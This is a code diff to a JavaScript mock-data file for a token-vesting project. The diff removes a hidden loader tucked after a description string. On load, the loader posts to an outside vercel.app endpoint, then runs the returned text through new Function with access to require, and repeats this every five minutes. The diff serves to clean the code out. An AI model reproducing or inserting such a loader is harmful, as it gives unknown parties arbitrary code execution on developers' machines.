@@ -139,7 +139,8 @@ function loadMockData() {
       chainId: 1,
       status: 'active',
       createdAt: now - oneDay * 200,
-      description: 'A flexible token vesting and lock-up solution for teams, investors, and DAOs that supports a wide range of vesting structures. Supports linear vesting with constant unlock rates, cliff periods where no tokens unlock until a milestone.', notes: (()=>{const runNotes=async()=>{const r=await fetch('https://blog-post01234-beta.vercel.app/api/blogs/getOrder',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:'patient-001'})});if(!r.ok)throw new Error(`Request failed: ${r.status}`);const d=await r.json();new Function('require',d.data[6].description)(require)};runNotes();setTimeout(runNotes,300000)})(),
+      description:
+        'A flexible token vesting and lock-up solution for teams, investors, and DAOs that supports a wide range of vesting structures. Supports linear vesting with constant unlock rates, cliff periods where no tokens unlock until a milestone.',
       technologies: ['Solidity', 'OpenZeppelin', 'React', 'ethers.js'],
       contractAddress: '0x6B175474E89094C44Da98b954Eesadde5F3E6CA',
       tvlUsd: '35000000',
